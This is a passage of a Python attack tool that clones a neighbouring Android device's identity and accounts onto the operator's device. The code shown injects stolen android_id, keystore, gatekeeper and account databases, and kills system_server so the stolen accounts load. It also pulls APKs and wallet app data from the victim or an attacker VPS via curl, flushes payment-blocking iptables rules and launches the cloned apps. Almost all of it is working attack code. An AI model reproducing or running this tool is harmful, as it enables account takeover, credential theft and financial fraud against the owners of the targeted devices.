                await b.cmd(f"setprop {prop} '{val}'")
                injected += 1

    # Inject android_id
    android_id = identity.get("android_id", "")
    if android_id:
        await b.cmd(f"settings put secure android_id {android_id}")
        print(f"    android_id → {android_id}")
        injected += 1

    print(f"    Injected {injected} identity properties")

    # ─── 3b: Keystore injection ───
    print("\n  [3b] Injecting keystore blobs...")
    ks_dir = ip_dir / "keystore"
    if ks_dir.exists():
        ks_files = list(ks_dir.iterdir())
        for ks_file in ks_files:
            # Reconstruct original path from filename
            orig_path = "/" + ks_file.name.replace("_", "/")
            # Fix common path reconstruction issues
            if "data/misc/keystore" in orig_path:
                pushed = await b.push_b64_file(str(ks_file), orig_path)
                if pushed > 0:
                    await b.cmd(f"chmod 600 {orig_path}")
                    await b.cmd(f"chown keystore:keystore {orig_path} 2>/dev/null")
        print(f"    Injected {len(ks_files)} keystore files")
    else:
        print(f"    No keystore data to inject")

    # ─── 3c: Gatekeeper + spblob injection ───
    print("\n  [3c] Injecting gatekeeper state...")
    gk_dir = ip_dir / "gatekeeper"
    spblob_dir = ip_dir / "spblob"
    gk_count = 0

    for subdir, target_base in [(gk_dir, "/data/system"), (spblob_dir, "/data/system_de/0/spblob")]:
        if subdir.exists():
            for f in subdir.iterdir():
                target = f"{target_base}/{f.name}"
                pushed = await b.push_b64_file(str(f), target)
                if pushed > 0:
                    await b.cmd(f"chmod 600 {target}")
                    await b.cmd(f"chown system:system {target} 2>/dev/null")
                    gk_count += 1

    print(f"    Injected {gk_count} gatekeeper/spblob files")

    # ─── 3d: Account database injection ───
    print("\n  [3d] Injecting account databases...")
    for db_name in ["accounts_de.db", "accounts_ce.db"]:
        db_file = ip_dir / db_name
        if not db_file.exists():
            print(f"    {db_name}: not found, skipping")
            continue

        if "de" in db_name:
            target = "/data/system_de/0/accounts_de.db"
        else:
            target = "/data/system_ce/0/accounts_ce.db"

        pushed = await b.push_b64_file(str(db_file), target)
        if pushed > 0:
            await b.cmd(f"chmod 600 {target}")
            await b.cmd(f"chown system:system {target}")
            print(f"    ✓ {db_name} → {target} ({pushed} bytes)")
        else:
            print(f"    ✗ {db_name}: push failed")

    # ─── 3e: GSF database injection ───
    print("\n  [3e] Injecting GSF database (gservices.db)...")
    gsf_file = ip_dir / "gservices.db"
    if gsf_file.exists():
        # Stop GMS first
        await b.cmd("am force-stop com.google.android.gms")
        await b.cmd("am force-stop com.google.android.gsf")

        target = "/data/data/com.google.android.gsf/databases/gservices.db"
        pushed = await b.push_b64_file(str(gsf_file), target)
        if pushed > 0:
            # Fix ownership to match gsf UID
            uid_out = await b.cmd("stat -c %u /data/data/com.google.android.gsf/ 2>/dev/null || echo 0")
            uid = uid_out.strip() if uid_out.strip().isdigit() else "0"
            await b.cmd(f"chown {uid}:{uid} {target}")
            await b.cmd(f"chmod 660 {target}")
            await b.cmd(f"restorecon {target}")
            print(f"    ✓ gservices.db injected ({pushed} bytes, uid={uid})")
        else:
            print(f"    ✗ gservices.db push failed")
    else:
        print(f"    No gservices.db to inject")

    # ─── 3f: system_server soft-kill ───
    print("\n  [3f] Executing system_server soft-kill...")
    print("    This forces AccountManager to reload injected databases")
    print("    The device will show boot animation briefly (~15-20s)")
    await b.cmd("kill $(pidof system_server)")

    # Wait for restart
    print("    Waiting for system_server restart...")
    await asyncio.sleep(25)

    # Verify system_server is back
    out = await b.cmd("pidof system_server")
    if out.strip():
        print(f"    ✓ system_server restarted (PID: {out.strip()})")
    else:
        print(f"    ⚠ system_server PID not found, waiting more...")
        await asyncio.sleep(15)

    # ─── 3g: Verify account injection ───
    print("\n  [3g] Verifying account injection...")
    acct_out = await b.cmd("dumpsys account 2>/dev/null | grep 'Account {' | head -10")
    if acct_out.strip():
        print(f"    Accounts detected:")
        for line in acct_out.strip().split("\n"):
            print(f"      {line.strip()}")
    else:
        print(f"    No accounts detected yet (may need more time)")

    return True


# ═══════════════════════════════════════════════════════════════════════
# PHASE 4: APP DEPLOYMENT + DATA INJECTION
# ═══════════════════════════════════════════════════════════════════════

async def phase4_deploy_apps(b: Bridge, ip: str) -> list:
    """Install APKs + inject app data with UID mapping + SELinux restore."""
    print("\n" + "="*70)
    print(f"  PHASE 4: APP DEPLOYMENT + DATA INJECTION")
    print("="*70)

    ip_dir = VPS_CLONE_DIR / ip.replace(".", "_")
    manifest_file = ip_dir / "extraction_manifest.json"
    if not manifest_file.exists():
        print(f"  ERROR: No extraction manifest")
        return []

    with open(manifest_file) as f:
        manifest = json.load(f)

    deployed = []
    app_data = manifest.get("extraction", {}).get("app_data", {})
    apk_manifest = manifest.get("extraction", {}).get("apks", {})

    for pkg in app_data:
        print(f"\n  --- Deploying {pkg} ---")

        # Check if already installed
        check = await b.cmd(f"pm path {pkg} 2>/dev/null | head -1")
        if check.strip():
            print(f"    Already installed")
        else:
            # Install APK(s)
            apks = apk_manifest.get(pkg, [])
            if not apks:
                print(f"    No APKs available, trying to pull live from neighbor...")
                # Pull directly from neighbor
                apk_out = await b.nb_cmd(ip, f"pm path {pkg} 2>/dev/null | head -1", timeout=8)
                if apk_out and "package:" in apk_out:
                    apk_path = apk_out.replace("package:", "").strip()
                    device_dest = f"{DEVICE_STAGING}/{pkg}_base.apk"
                    pulled = await b.nb_pull_file(ip, apk_path, device_dest, timeout=120)
                    if pulled > 0:
                        result = await b.cmd(f"pm install -r -d -g {device_dest} 2>&1", t=60)
                        if "Success" in (result or ""):
                            print(f"    ✓ APK installed ({pulled/1024:.0f}KB)")
                        else:
                            result2 = await b.cmd(
                                f"pm install -r -d -g --bypass-low-target-sdk-block {device_dest} 2>&1", t=60)
                            if "Success" in (result2 or ""):
                                print(f"    ✓ APK installed (bypass flag)")
                            else:
                                print(f"    ✗ Install failed: {(result or result2 or '')[:100]}")
                                continue
                    await b.cmd(f"rm -f {device_dest}")
                else:
                    print(f"    No APK source available, skipping")
                    continue
            elif len(apks) == 1:
                # Single APK
                vps_path = ip_dir.parent / f"{ip.replace('.','_')}/apks/{apks[0]['name']}"
                # Push via upload server reverse (curl from device)
                device_dest = f"{DEVICE_STAGING}/{pkg}_base.apk"
                await b.cmd(f"curl -s -o {device_dest} http://{VPS_IP}:19000/{ip.replace('.','_')}/apks/{pkg}_{apks[0]['name']}")
                result = await b.cmd(f"pm install -r -d -g {device_dest} 2>&1", t=60)
                if "Success" in (result or ""):
                    print(f"    ✓ APK installed")
                else:
                    print(f"    ✗ Install failed: {(result or '')[:100]}")
                await b.cmd(f"rm -f {device_dest}")
            else:
                # Split APK session install
                total_size = sum(a.get("size", 0) for a in apks)
                session_out = await b.cmd(f"pm install-create -S {total_size} 2>&1")
                session_id = None
                if session_out:
                    m = re.search(r'\[(\d+)\]', session_out)
                    if m:
                        session_id = m.group(1)

                if session_id:
                    for idx, apk_info in enumerate(apks):
                        fname = apk_info["name"]
                        device_dest = f"{DEVICE_STAGING}/{pkg}_{fname}"
                        # Pull from VPS
                        vps_name = f"{ip.replace('.','_')}/apks/{pkg}_{fname}"
                        await b.cmd(f"curl -s -o {device_dest} http://{VPS_IP}:19000/{vps_name}")
                        name = "base" if idx == 0 else f"split_{idx}"
                        await b.cmd(
                            f"pm install-write -S {apk_info.get('size',0)} "
                            f"{session_id} {name}.apk {device_dest} 2>&1"
                        )
                        await b.cmd(f"rm -f {device_dest}")

                    result = await b.cmd(f"pm install-commit {session_id} 2>&1")
                    if "Success" in (result or ""):
                        print(f"    ✓ Split APK installed ({len(apks)} splits)")
                    else:
                        print(f"    ✗ Split install failed: {(result or '')[:100]}")

        # ─── Inject app data ───
        tar_info = app_data[pkg]
        if tar_info.get("tar_size", 0) > 0:
            print(f"    Injecting app data...")

            # Force stop app
            await b.cmd(f"am force-stop {pkg}")

            # Discover target UID on our device
            uid_out = await b.cmd(f"stat -c %u /data/data/{pkg}/ 2>/dev/null || echo 0")
            uid = uid_out.strip() if uid_out.strip().isdigit() else "10000"

            # Download app data tar from VPS
            device_tar = f"{DEVICE_STAGING}/{pkg}_data.tar.gz"
            vps_tar = f"{ip.replace('.','_')}/appdata/{pkg}.tar.gz"
            await b.cmd(f"curl -s -o {device_tar} http://{VPS_IP}:19000/{vps_tar}")

            # Verify download
            sz = await b.cmd(f"wc -c < {device_tar} 2>/dev/null || echo 0")
            try:
                dl_size = int(sz.strip())
            except:
                dl_size = 0

            if dl_size > 0:
                # Extract to staging
                await b.cmd(f"mkdir -p {DEVICE_STAGING}/extract")
                await b.cmd(f"tar xzf {device_tar} -C {DEVICE_STAGING}/extract 2>/dev/null")

                # Copy data directories
                for subdir in WALLET_DATA_PATHS:
                    src = f"{DEVICE_STAGING}/extract/data/data/{pkg}/{subdir}"
                    dst = f"/data/data/{pkg}/{subdir}"
                    await b.cmd(f"mkdir -p {dst} 2>/dev/null")
                    await b.cmd(f"cp -rf {src}/* {dst}/ 2>/dev/null")

                # Fix ownership (UID mapping — critical per Google Doc)
                await b.cmd(f"chown -R {uid}:{uid} /data/data/{pkg}/")

                # Fix permissions
                await b.cmd(f"chmod -R 770 /data/data/{pkg}/")

                # SELinux context restoration (critical per Google Doc)
                await b.cmd(f"restorecon -R /data/data/{pkg}/")

                print(f"    ✓ App data injected (uid={uid}, restorecon applied)")

                # Cleanup
                await b.cmd(f"rm -rf {DEVICE_STAGING}/extract {device_tar}")
            else:
                print(f"    ✗ Download failed from VPS")

        deployed.append(pkg)

    return deployed


# ═══════════════════════════════════════════════════════════════════════
# PHASE 5: FINALIZE — iptables + verification + app launch
# ═══════════════════════════════════════════════════════════════════════

async def phase5_finalize(b: Bridge, deployed: list) -> dict:
    """Flush iptables, verify clone, launch apps."""
    print("\n" + "="*70)
    print(f"  PHASE 5: FINALIZATION & VERIFICATION")
    print("="*70)

    results = {"iptables": False, "accounts": [], "apps": {}}

    # ─── 5a: iptables flush ───
    print("\n  [5a] Flushing payment-blocking iptables rules...")
    # Check for payment blocks
    blocks = await b.cmd("iptables -L OUTPUT -n 2>/dev/null | grep -i 'payments\\|google\\|bm'")
    if blocks.strip():
        print(f"    Found blocks: {blocks.strip()[:200]}")
        await b.cmd("iptables -F OUTPUT 2>/dev/null")
        print(f"    ✓ OUTPUT chain flushed")
        results["iptables"] = True
    else:
        print(f"    No payment blocks to flush")

    # ─── 5b: Verify accounts ───
    print("\n  [5b] Verifying injected accounts...")
    acct_out = await b.cmd("dumpsys account 2>/dev/null | grep 'Account {' | head -10")
    if acct_out.strip():
        for line in acct_out.strip().split("\n"):
            line = line.strip()
            results["accounts"].append(line)
            print(f"    ✓ {line}")
    else:
        print(f"    ⚠ No accounts detected")

    # ─── 5c: Verify Android ID ───
    print("\n  [5c] Verifying android_id...")
    aid = await b.cmd("settings get secure android_id")
    print(f"    android_id: {aid.strip()}")

    # ─── 5d: Launch and verify each deployed app ───
    print("\n  [5d] Launching deployed apps...")
    for pkg in deployed:
        # Get launch activity
        launch = await b.cmd(
            f"cmd package resolve-activity --brief {pkg} 2>/dev/null | tail -1"
        )
        if launch.strip() and "/" in launch.strip():
            await b.cmd(f"am start -n {launch.strip()} 2>/dev/null")
            print(f"    ✓ Launched {pkg}")
            results["apps"][pkg] = "launched"
            await asyncio.sleep(3)
        else:
            print(f"    ⚠ No launch activity for {pkg}")
            results["apps"][pkg] = "no_activity"

    # ─── 5e: Summary ───
    print("\n" + "="*70)
    print("  CLONE OPERATION SUMMARY")
    print("="*70)
    print(f"  Accounts injected: {len(results['accounts'])}")
    print(f"  Apps deployed: {len(deployed)}")
    print(f"  iptables cleared: {results['iptables']}")
    for pkg, status in results["apps"].items():
        print(f"    {pkg}: {status}")

    return results


# ═══════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════

async def run_scan():
    """Scan and profile neighbors (Phase 0+1)."""
    b = Bridge()
    env = await phase0_escape(b)
    profiles = await phase1_scan(b)
    return profiles

async def run_clone(target_ip):
    """Full clone operation on a specific target (Phase 2-5)."""
    b = Bridge()

    # Phase 0: Validate escape
    env = await phase0_escape(b)
    if not env.get("escape_ready"):
        print("\n  WARNING: Escape context not optimal, proceeding anyway...")

    # Phase 2: Extract
    manifest = await phase2_extract(b, target_ip)

    # Phase 3: Inject system
    success = await phase3_inject_system(b, target_ip)

    # Phase 4: Deploy apps
    deployed = await phase4_deploy_apps(b, target_ip)

    # Phase 5: Finalize
    results = await phase5_finalize(b, deployed)

    return results

async def run_auto():
    """Full automatic: scan → pick best rooted target → clone."""
    b = Bridge()

    # Phase 0+1
    env = await phase0_escape(b)
    profiles = await phase1_scan(b)

    # Pick best rooted target
    rooted = [p for p in profiles if p.get("root") and p.get("score", 0) > 0]
    if not rooted:
        print("\n  No rooted neighbors with high-value apps found.")
        print("  Falling back to highest-scored neighbor regardless of root...")
        rooted = [p for p in profiles if p.get("score", 0) > 0]

    if not rooted:
        print("\n  No suitable targets found. Aborting.")
        return

    target = rooted[0]
    print(f"\n  SELECTED TARGET: {target['ip']} ({target.get('brand','')} {target.get('model','')})")
    print(f"  Score: {target['score']} | Root: {target.get('root')} | Apps: {target.get('app_count',0)}")

    # Phase 2-5
    manifest = await phase2_extract(b, target["ip"])
    success = await phase3_inject_system(b, target["ip"])
    deployed = await phase4_deploy_apps(b, target["ip"])
    results = await phase5_finalize(b, deployed)

async def run_extract(target_ip):
    """Extract only (Phase 2) — save to VPS, no injection."""
    b = Bridge()
    env = await phase0_escape(b)
    manifest = await phase2_extract(b, target_ip)
    print(f"\n  Extraction complete. Data saved to {VPS_CLONE_DIR / target_ip.replace('.','_')}")

async def run_inject(target_ip):
    """Inject only (Phase 3-5) — from previously extracted data."""
    b = Bridge()
    env = await phase0_escape(b)
    success = await phase3_inject_system(b, target_ip)
    deployed = await phase4_deploy_apps(b, target_ip)
    results = await phase5_finalize(b, deployed)


def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python3 tools/advanced_neighbor_clone.py scan")
        print("  python3 tools/advanced_neighbor_clone.py clone <IP>")
        print("  python3 tools/advanced_neighbor_clone.py auto")
        print("  python3 tools/advanced_neighbor_clone.py extract <IP>")
        print("  python3 tools/advanced_neighbor_clone.py inject <IP>")
        sys.exit(1)

    cmd = sys.argv[1]

    if cmd == "scan":
        asyncio.run(run_scan())
    elif cmd == "clone" and len(sys.argv) >= 3:
        asyncio.run(run_clone(sys.argv[2]))
    elif cmd == "auto":
        asyncio.run(run_auto())
    elif cmd == "extract" and len(sys.argv) >= 3:
        asyncio.run(run_extract(sys.argv[2]))
    elif cmd == "inject" and len(sys.argv) >= 3:
        asyncio.run(run_inject(sys.argv[2]))
    else:
        print(f"Unknown command: {cmd}")
        sys.exit(1)


if __name__ == "__main__":
    main()
